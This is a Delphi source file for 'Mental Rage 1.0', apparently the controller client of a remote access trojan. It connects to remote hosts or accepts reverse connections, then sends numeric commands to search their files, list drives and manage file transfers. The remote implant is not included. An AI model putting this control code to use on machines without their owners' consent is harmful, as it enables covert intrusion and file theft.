unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ExtCtrls, StdCtrls, ScktComp, Winsock, ImgList, Menus;

type
  TForm1 = class(TForm)
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Edit1: TEdit;
    Edit2: TEdit;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    Button4: TButton;
    Button5: TButton;
    Button6: TButton;
    Button7: TButton;
    Button8: TButton;
    Button9: TButton;
    Button10: TButton;
    Button11: TButton;
    Button12: TButton;
    Button13: TButton;
    Panel1: TPanel;
    Splitter1: TSplitter;
    Memo1: TMemo;
    Panel_Info: TPanel;
    Button14: TButton;
    Button15: TButton;
    Button16: TButton;
    Button17: TButton;
    Button18: TButton;
    Button19: TButton;
    ConTimer: TTimer;
    ProgressBar1: TProgressBar;
    StatusBar1: TStatusBar;
    Panel_Transfer: TPanel;
    ListView1: TListView;
    Button20: TButton;
    Button21: TButton;
    Button22: TButton;
    Panel_Status: TPanel;
    Label4: TLabel;
    Panel5: TPanel;
    Label5: TLabel;
    Label6: TLabel;
    Panel6: TPanel;
    Label7: TLabel;
    Label8: TLabel;
    Panel7: TPanel;
    Panel_Find: TPanel;
    ListView2: TListView;
    Label9: TLabel;
    Edit3: TEdit;
    Button23: TButton;
    Panel_Config: TPanel;
    Label10: TLabel;
    Edit4: TEdit;
    CheckBox2: TCheckBox;
    Panel_Sin: TPanel;
    Label11: TLabel;
    Edit5: TEdit;
    Button25: TButton;
    Button26: TButton;
    ListView3: TListView;
    ServerSocket1: TServerSocket;
    Button27: TButton;
    CheckBox1: TCheckBox;
    CheckBox3: TCheckBox;
    CheckBox4: TCheckBox;
    Image1: TImage;
    Image2: TImage;
    Image3: TImage;
    Panel_About: TPanel;
    Image4: TImage;
    Label12: TLabel;
    Label13: TLabel;
    Memo2: TMemo;
    Label14: TLabel;
    Label15: TLabel;
    Button24: TButton;
    CheckBox5: TCheckBox;
    ImageList1: TImageList;
    PopupMenu1: TPopupMenu;
    Clear1: TMenuItem;
    Panel_Intro: TPanel;
    Image5: TImage;
    ComboBox1: TComboBox;
    Button28: TButton;
    Procedure Status(Str:String);
    Procedure Info(Str:String);
    procedure Button3Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure Button11Click(Sender: TObject);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
    procedure Edit2KeyPress(Sender: TObject; var Key: Char);
    procedure Edit5KeyPress(Sender: TObject; var Key: Char);
    function  SendString(Str:String):boolean;
    procedure Button2Click(Sender: TObject);
    procedure Button25Click(Sender: TObject);
    procedure Button26Click(Sender: TObject);
    procedure Button23Click(Sender: TObject);
    procedure Button27Click(Sender: TObject);
    procedure ServerSocket1ClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1ClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure ServerSocket1ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure DoShit(str:String;ip:string);
    procedure FormCreate(Sender: TObject);
    procedure Button13Click(Sender: TObject);
    procedure ConTimerTimer(Sender: TObject);
    procedure Edit4KeyPress(Sender: TObject; var Key: Char);
    procedure Button24Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure ListView3DblClick(Sender: TObject);
    procedure Clear1Click(Sender: TObject);
    procedure Button21Click(Sender: TObject);
    procedure Button14Click(Sender: TObject);
    procedure Button17Click(Sender: TObject);
    procedure Button15Click(Sender: TObject);
    procedure Button18Click(Sender: TObject);
    procedure Button16Click(Sender: TObject);
    procedure Button19Click(Sender: TObject);
    procedure Button22Click(Sender: TObject);
    procedure Button20Click(Sender: TObject);
    Function Windir:String;
    Function Sysdir:String;
    procedure Memo1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Button28Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  Sock             : TSocket;
  Wsadatas         : TWSADATA;
  SockAddrIn       : TSockAddrIn;
  Buffer : Array[0..36000] Of Char;
  SIN              : Boolean;
  IP               : String;

implementation

{$R *.dfm}

Function TForm1.Sysdir:String;
Var
 B:Array[0..255]Of Char;
Begin
 GetSystemDirectory(B, 255);
 Result := String(B)+'\';
End;

Function TForm1.Windir:String;
Var
 B:Array[0..255]Of Char;
Begin
 GetWindowsDirectory(B, 255);
 Result := String(B)+'\';
End;

procedure TForm1.DoShit(str:String;ip:String);
Var
 I             :Integer;
 Cmd,
 Param,
 Tmp1,Tmp2,Tmp3:String;
 Item          :TListItem;
Begin
 If Pos(#13, Str)>0 Then Str:=Copy(Str, 1, Pos(#13, Str)-1);

 Panel6.Caption := IntToStr(StrToInt(Panel6.Caption)+Length(Str));
 Cmd := Copy(Str, 1, 2);
 Param := Copy(Str, 3, Length(Str));

 If Cmd <> '38' Then
  Info('Server -> '+Param);

 If Pos(Copy(Cmd, 1, 1), '0123456789')=0 Then Begin
  Info('Received Non-Mental Commando, Ignoring.');
  Exit;
 End;

 If Pos(Copy(Cmd, 2, 1), '0123456789')=0 Then Begin
  Info('Received Non-Mental Commando, Ignoring.');
  Exit;
 End;

 Case StrToInt(Cmd) Of
 // ---- Version ----
  10:StatusBar1.Panels[0].Text := Param;
 // ---- OS ----
  11:For I := 0 To ListView3.Items.Count -1 Do Begin
      If ListView3.Items[i].Caption = IP Then
       ListView3.Items[i].SubItems[0] := Param;
     End;
 // ---- Net Speed ----
  12:For I := 0 To ListView3.Items.Count -1 Do Begin
      If ListView3.Items[i].Caption = IP Then
       ListView3.Items[i].SubItems[1] := Param;
     End;
 // ---- Search Files ----
  38:Begin
      If param = '' Then Exit;
      Item := ListView2.Items.Add;
      Tmp1 := Copy(Param, 1, Pos(':', Param)-1);
      Tmp2 := Copy(Param, Pos(':', Param)+1, Length(Param));
      Item.Caption := ExtractFileName(Tmp2);
      Item.SubItems.Add(Tmp1);
      Item.SubItems.Add(Tmp2);
     End;
 // ---- Get Drivers ----
  39:Begin
      If param = '' Then Exit;
      ComboBox1.Items.Add(Param);
      ComboBox1.ItemIndex := 0;
     End;
 End;
End;

Procedure TForm1.Status(Str:String);
Begin
 StatusBar1.Panels[1].Text := 'Status : '+Str;
End;

Procedure TForm1.Info(Str:String);
Var
 F      :TextFile;
Begin
 Memo1.Lines.Add(Str);
 If Not CheckBox1.Checked Then Exit;
 AssignFile(F, 'Log.txt');
 If FileExists('Log.txt') Then
  Append(F)
 Else
  ReWrite(F);
 WriteLn(F, TimeToStr(Now)+' >> '+Str);
 CloseFile(F);
End;

procedure TForm1.Button3Click(Sender: TObject);
begin

panel_info.Visible := True;
panel_config.Visible := False;
panel_transfer.Visible := False;
panel_status.Visible := False;
panel_find.Visible := False;
panel_sin.Visible := False;
panel_about.Visible := False;

Panel_info.Align := AlClient;
end;

procedure TForm1.Button8Click(Sender: TObject);
begin
panel_info.Visible := False;
panel_config.Visible := False;
panel_transfer.Visible := True;
panel_status.Visible := False;
panel_find.Visible := False;
panel_sin.Visible := False;
panel_about.Visible := False;

panel_transfer.Align := AlClient;
end;

procedure TForm1.Button9Click(Sender: TObject);
begin
panel_info.Visible := False;
panel_config.Visible := False;
panel_transfer.Visible := False;
panel_status.Visible := True;
panel_find.Visible := False;
panel_sin.Visible := False;
panel_about.Visible := False;

panel_status.Align := AlClient;
end;

procedure TForm1.Button10Click(Sender: TObject);
begin
panel_info.Visible := False;
panel_config.Visible := False;
panel_transfer.Visible := False;
panel_status.Visible := False;
panel_find.Visible := True;
panel_sin.Visible := False;
panel_about.Visible := False;

panel_find.Align := AlClient;
end;

procedure TForm1.Button11Click(Sender: TObject);
begin
panel_info.Visible := False;
panel_config.Visible := True;
panel_transfer.Visible := False;
panel_status.Visible := False;
panel_find.Visible := False;
panel_sin.Visible := False;
panel_about.Visible := False;

panel_config.Align := AlClient;
end;

procedure TForm1.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
if pos(key, '0123456789.'#8)=0 Then
 ZeroMemory(@Key, SizeOf(Key));
end;

procedure TForm1.Edit2KeyPress(Sender: TObject; var Key: Char);
begin
if pos(key, '0123456789'#8)=0 Then
 ZeroMemory(@Key, SizeOf(Key));
end;

procedure TForm1.Edit5KeyPress(Sender: TObject; var Key: Char);
begin
if pos(key, '0123456789'#8)=0 Then
 ZeroMemory(@Key, SizeOf(Key));
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
panel_info.Visible := False;
panel_config.Visible := False;
panel_transfer.Visible := False;
panel_status.Visible := False;
panel_find.Visible := False;
panel_sin.Visible := True;
panel_about.Visible := False;

panel_sin.Align := AlClient;
end;

procedure TForm1.Button25Click(Sender: TObject);
begin
Info('SIN Started : '+Edit5.Text);
ServerSocket1.port := strtoint(edit5.text);
serversocket1.Active := true;
end;

procedure TForm1.Button26Click(Sender: TObject);
begin
If ServerSocket1.Active Then
 ServerSocket1.Active := False;
 Info('SIN Stopped');
 ListView3.Items.Clear;
end;

procedure TForm1.Button23Click(Sender: TObject);
begin
If Button23.Caption = 'Search' Then Begin
 Status('Sending search commando');
 SendString('38'+combobox1.text+Edit3.Text+#13);
 Button23.Caption := 'Stop';
End Else
If Button23.Caption = 'Stop' Then Begin
 SendString('38'+#13);
 Button23.Caption := 'Search';
End;
end;

procedure TForm1.Button27Click(Sender: TObject);
var
 S:String;
begin
 S := ('You can use following types of search:'+#13#10);
 S := S + (' *.jpg - Find all jpg files'+#13#10);
 S := S + (' te*.jpg - Find all jpg starting with te'+#13#10);
 S := S + (' *st.jpg - Find all jpg ending with st'+#13#10);
 S := S + (' *test*.jpg - Find all jpg containing test');
 MessageBox(0, pChar(S), 'Help', mb_ok);
end;

procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
var
  item:TListItem;
begin
  item := listview3.Items.Add;
  item.ImageIndex := 2;
  item.Caption := socket.RemoteAddress;
  item.SubItems.Add('?');
  item.SubItems.Add('?');
end;

procedure TForm1.ServerSocket1ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
var
 i:integer;
begin
 for i := 0 to listview3.Items.Count -1 do
  if listview3.Items[i].Caption = socket.RemoteAddress then
   listview3.items[i].Delete;

 If socket.RemoteAddress = IP Then begin
  CloseSocket(Sock);
  Form1.Status('Disconnected.');
  Form1.Info('Server closed.');
  Form1.Button1.Caption := '&Connect';
 End;
end;

procedure TForm1.ServerSocket1ClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
var
 i:integer;
begin
 errorcode := 0;
 for i := 0 to listview3.Items.Count -1 do
  if listview3.Items[i].Caption = socket.RemoteAddress then
   listview3.items[i].Delete;
 If socket.RemoteAddress = IP Then begin
  CloseSocket(Sock);
  Form1.Status('Disconnected.');
  Form1.Info('Server closed.');
  Form1.Button1.Caption := '&Connect';
 End;
end;

procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
 s:string;
begin
 s := socket.ReceiveText;
 If (S <> '') and (Pos(#13, S)=0) Then Exit; 
 If copy(s, pos(#13, s)+1, length(s)) <> '' then Begin
  If (S <> '') and (Pos(#13, S)=0) Then Exit;
  while s <>'' do begin
   DoShit(copy(s, 1, pos(#13, s)-1), Socket.RemoteAddress);
   s := copy(s, pos(#13, s)+1, length(s));
  end
 End else DoShit(S, Socket.RemoteAddress);
end;

procedure TForm1.FormCreate(Sender: TObject);
var
 F:TextFile;
 l1,l2,t:string;
begin
If FileExists('Settings.cfg') Then Begin
 AssignFile(F, 'Settings.cfg');
 Reset(F);
 Read(F, l1);
 ReadLn(F, l2);
 T := L1+#13;
 While Not Eof(F) Do Begin
  Read(F, l1);
  ReadLn(F, l2);
  T := T + L1+#13;
 End;
 CloseFile(F);
//pos, con, log, encrypu
 If Pos('PORT',T)>0 Then Begin
  Edit2.text := Copy(T, Pos('PORT', T)+5, 6);
  Edit2.text := Copy(Edit2.text, 1, pos(#13, Edit2.text)-1);
 End;
 If Pos('IP',T)>0 Then Begin
  Edit1.text := Copy(T, Pos('IP', T)+3, 15);
  Edit1.text := Copy(Edit1.text, 1, pos(#13, Edit1.text)-1);
 End;

 If Pos('SAVE_POS',T)>0 Then
  If Copy(T, Pos('SAVE_POS',T)+9, 1) = '1' Then
   CheckBox4.Checked := True Else CheckBox4.Checked := False;
 If Pos('SAVE_LOG',T)>0 Then
  If Copy(T, Pos('SAVE_LOG',T)+9, 1) = '1' Then
   CheckBox1.Checked := True Else CheckBox1.Checked := False;
 If Pos('SAVE_CON',T)>0 Then
  If Copy(T, Pos('SAVE_CON',T)+9, 1) = '1' Then
   CheckBox3.Checked := True Else CheckBox3.Checked := False;
 If Pos('ENCRYPT',T)>0 Then
  If Copy(T, Pos('ENCRYPT',T)+8, 1) = '1' Then
   CheckBox5.Checked := True Else CheckBox5.Checked := False;

End;
Info('Client started at '+DateToStr(Now));
Caption := 'Mental Rage 1.0';

Panel1.width := 293;
panel1.height := 193;

Form1.Height := 277;
Form1.Width := 393;

panel_about.visible := false;
panel_config.visible := false;
panel_find.visible := false;
panel_info.visible := false;
panel_sin.visible := false;
panel_status.visible := false;
panel_transfer.visible := false;
end;

procedure TForm1.Button13Click(Sender: TObject);
begin
panel_info.Visible := False;
panel_config.Visible := False;
panel_transfer.Visible := False;
panel_status.Visible := False;
panel_find.Visible := False;
panel_sin.Visible := False;
panel_about.Visible := True;

panel_about.Align := AlClient;
end;

procedure TForm1.ConTimerTimer(Sender: TObject);
var
 d,h,m,s:integer;
begin

 d := strtoint(copy(panel7.Caption,1,2));
 h := strtoint(copy(panel7.Caption,4,2));
 m := strtoint(copy(panel7.Caption,7,2));
 s := strtoint(copy(panel7.Caption,10,2));

 inc(s);
 if s = 60 then
  inc(m);
 if m = 60 then
  inc(h);
 if h = 24 then
  inc(d);

 if s = 60 then
  s := 0;
 if m = 60 then
  m := 0;
 if h = 24 then
  h := 0;

 panel7.caption := '';
 If Length(inttostr(d)) = 1 then panel7.Caption := '0'+inttostr(d) else
 panel7.Caption := inttostr(d);

 panel7.Caption := panel7.Caption + ':';

 If Length(inttostr(h)) = 1 then panel7.Caption := panel7.Caption + '0'+inttostr(h) else
 panel7.Caption := panel7.Caption + inttostr(h);

 panel7.Caption := panel7.Caption + ':';

 If Length(inttostr(m)) = 1 then panel7.Caption := panel7.Caption + '0'+inttostr(m) else
 panel7.Caption := panel7.Caption + inttostr(m);

 panel7.Caption := panel7.Caption + ':';

 If Length(inttostr(s)) = 1 then panel7.Caption := panel7.Caption + '0'+inttostr(s) else
 panel7.Caption := panel7.Caption + inttostr(s);


end;

procedure TForm1.Edit4KeyPress(Sender: TObject; var Key: Char);
begin
if (key = '\') or (key = ':') or
   (key = '/') or (key = '*') or
   (key = '?') or (key = '"') or
   (key = '<') or (key = '>') or
   (key = '|') Then
 zeromemory(@key, sizeof(key));
end;

procedure TForm1.Button24Click(Sender: TObject);
begin
if CreateDirectory(pChar( ExtractFilePath(ParamStr(0))+Edit4.text ), NIL) then
 Info('Done creating '+edit4.text+'\')
else
 Info('Error creating '+edit4.text+'\');
end;

procedure Rece;
Var
 F:String;
Begin
 While Form1.StatusBar1.Panels[1].Text = 'Status : Connected.' Do Begin
  If Recv(Sock, Buffer, SizeOf(Buffer), 0) < 1 Then Begin
   CloseSocket(Sock);
   Form1.Status('Disconnected.');
   Form1.Info('Server closed.');
   Form1.Button1.Caption := '&Connect';
   Exit;
  End Else Begin
   F := Buffer;
   If copy(F, pos(#13, F)+1, length(F)) <> '' then
    while F <>'' do begin
     Form1.DoShit(copy(F, 1, pos(#13, F)-1), '');
     F := copy(F, pos(#13, F)+1, length(F));
    end
   else Form1.DoShit(F, '');
  End;
  ZeroMemory(@Buffer, SizeOf(Buffer));
 End;
End;

Function TForm1.SendString(Str:String):Boolean;
Var
 I:Integer;
 f:textfile;
Begin
 If Not SIN Then Begin
  Result := False;
  If Send(Sock, Str[1], Length(Str), 0) = ERROR_SUCCESS Then Result := True;
  Panel5.Caption := IntToStr(StrToInt(Panel5.Caption)+Length(Str));
 End Else Begin
  If Not ServerSocket1.Active Then Exit;
  For I := 0 To ServerSocket1.Socket.ActiveConnections-1 Do
   If ServerSocket1.Socket.Connections[i].RemoteAddress = IP Then
    ServerSocket1.Socket.Connections[i].SendText(Str);
 End;

 If Not CheckBox1.Checked Then Exit;
 AssignFile(F, 'Log.txt');
 If FileExists('Log.txt') Then
  Append(F)
 Else
  ReWrite(F);
 WriteLn(F, TimeToStr(Now)+' >> Client -> '+Str);
 CloseFile(F);

End;

procedure TForm1.Button1Click(Sender: TObject);
var
  A                : Dword;
begin
  SIN := False;
  If Button1.Caption = '&Disconnect' Then Begin
   CloseSocket(Sock);
   Form1.Button1.Caption := '&Connect';
   Exit;
  End;
  WSAStartUp(257,wsadatas);
  Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
  SockAddrIn.sin_family:=AF_INET;
  SockAddrIn.sin_port:=htons(StrToInt(Edit2.text));
  SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(Edit1.text));
  Info('Connecting to '+Edit1.text+':'+edit2.text);
  Status('Connecting..');
  If Connect(Sock,SockAddrIn,SizeOf(SockAddrIn)) = ERROR_SUCCESS Then Begin
   Status('Connected.');
   Info('Successfully connected to '+Edit1.text+':'+Edit2.text);
   CreateThread(NIL, 0, @Rece, NIL, 0, A);
   Button1.Caption := '&Disconnect';
   SendString('101.0'#13'11win 2k'#13'1210mbit'#13);
  End Else Begin
   Status('Disconnected.');
   Info('Could not connect to '+Edit1.text+':'+Edit2.text);
   Button23.Caption := 'Search';
   WSACleanup();
  End;
end;

procedure TForm1.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
var
 F:TextFile;
begin
 CanClose := False;
 If CheckBox2.Checked Then Begin
  AssignFile(F, 'Settings.cfg');
  ReWrite(F);

  If CheckBox4.Checked then
   WriteLn(F, 'SAVE_POS=1')
  Else
   WriteLn(F, 'SAVE_POS=0');

  If Checkbox3.Checked Then
   WriteLn(F, 'SAVE_CON=1')
  Else
   WriteLn(F, 'SAVE_CON=0');

  If Checkbox1.Checked Then
   WriteLn(F, 'SAVE_LOG=1')
  Else
   WriteLn(F, 'SAVE_LOG=0');

  If Checkbox5.Checked Then
   WriteLn(F, 'ENCRYPT=1')
  Else
   WriteLn(F, 'ENCRYPT=0');

  If CheckBox3.Checked Then Begin
   WriteLn(F, 'IP='+Edit1.text);
   WriteLn(F, 'PORT='+Edit2.text);
  End;
  CloseFile(F);
 End;
 Info('------------'#13#10);
 ServerSocket1.Active := False;
 ExitProcess(0);
end;

procedure TForm1.ListView3DblClick(Sender: TObject);
begin
 If ListView3.ItemIndex = -1 Then Exit;
 SIN := True;
 IP := ListView3.ItemFocused.Caption;
 Button1.Caption := '&Disconnect';
 Info('Connected to '+IP+' now');
 Status('Connected.');
end;

procedure TForm1.Clear1Click(Sender: TObject);
begin
Memo1.Clear;
end;

procedure TForm1.Button21Click(Sender: TObject);
var
 I:Integer;
begin
 If ListView1.Items.Count <= 0 Then Exit;
 SendString('37'#13);
 For I := 0 To ListView1.Items.Count -1 do
  If ListView1.Items[i].SubItems[0] = 'Sending' Then Begin
   ListView1.Items[i].SubItems[0] := 'Incomplete';
  End;
end;

procedure TForm1.Button14Click(Sender: TObject);
begin
 SendString('13'#13);
end;

procedure TForm1.Button17Click(Sender: TObject);
begin
 SendString('16'#13);
end;

procedure TForm1.Button15Click(Sender: TObject);
begin
 SendString('14'#13);
end;

procedure TForm1.Button18Click(Sender: TObject);
begin
 SendString('17'#13);
end;

procedure TForm1.Button16Click(Sender: TObject);
begin
 SendString('15'#13);
end;

procedure TForm1.Button19Click(Sender: TObject);
begin
 SendString('18'#13);
end;

procedure TForm1.Button22Click(Sender: TObject);
var
 I:Integer;
begin
 If ListView1.Items.Count <= 0 Then Exit;
 SendString('37'#13);
 For I:=0 To ListView1.Items.Count -1 Do
  ListView1.Items[i].SubItems[0] := 'Incomplete';
end;

procedure TForm1.Button20Click(Sender: TObject);
var
 i:integer;
begin
 If ListView1.Items.Count <= 0 Then Exit;
 For I:=0 To ListView1.Items.Count -1 Do
  If (ListView1.Items[i].SubItems[0] = 'Done') or (ListView1.Items[i].SubItems[0] = 'Incomplete') Then ListView1.Items[i].Delete;
end;

procedure TForm1.Memo1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
 mx,my:integer;
 p:tpoint;
begin
 getcursorpos(p);
 mx := p.x;
 my := p.y;
 if Button = mbright then
  PopUpMenu1.Popup(mX, mY);
 Exit;
end;

procedure TForm1.Button28Click(Sender: TObject);
begin
ComboBox1.Clear;
Status('Getting Drivers');
SendString('39'+#13);
end;

end.
